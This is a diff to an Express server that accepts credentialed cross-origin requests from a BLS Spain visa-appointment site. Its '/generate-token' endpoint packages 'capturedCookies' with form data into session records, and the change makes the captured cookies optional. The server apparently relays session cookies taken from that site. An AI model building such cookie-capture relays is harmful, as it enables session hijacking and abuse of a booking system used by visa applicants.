@@ -3,18 +3,15 @@ const bodyParser = require('body-parser');
 const cors = require('cors');
 
 const app = express();
-const port = process.env.PORT || 3001;
+const port = process.env.PORT || 3000; // Use port 3000 for Render
 
 // Enable CORS for specific origin
 app.use(cors({
-    origin: 'https://southafrica.blsspainglobal.com', // Allow requests from this origin
-    methods: ['GET', 'POST', 'OPTIONS'], // Allow GET, POST, and OPTIONS requests
-    credentials: true, // Allow cookies and credentials
-    allowedHeaders: ['Content-Type', 'Authorization'], // Allow specific headers
+    origin: 'https://southafrica.blsspainglobal.com',
+    methods: ['GET', 'POST', 'OPTIONS'],
+    credentials: true,
+    allowedHeaders: ['Content-Type', 'Authorization'],
 }));
-
-// Handle preflight requests
-app.options('*', cors()); // Enable preflight for all routes
 
 // Middleware to parse URL-encoded and JSON data
 app.use(bodyParser.urlencoded({ extended: true }));
@@ -46,14 +43,17 @@ app.post('/generate-token', (req, res) => {
     const { url, formData } = req.body;
 
     // Validate required fields
-    if (!url || !formData || !capturedCookies) {
-        console.error("Missing required fields:", { url, formData, cookies: capturedCookies });
-        return res.status(400).json({ error: 'Missing required fields: url, formData, or cookies' });
+    if (!url || !formData) {
+        console.error("Missing required fields:", { url, formData });
+        return res.status(400).json({ error: 'Missing required fields: url or formData' });
     }
+
+    // Use stored cookies if available
+    const cookies = capturedCookies || 'No cookies captured';
 
     const sessionData = {
         url,
-        cookies: capturedCookies, // Use the stored cookies
+        cookies,
         formData,
         timestamp: new Date().toISOString(),
     };
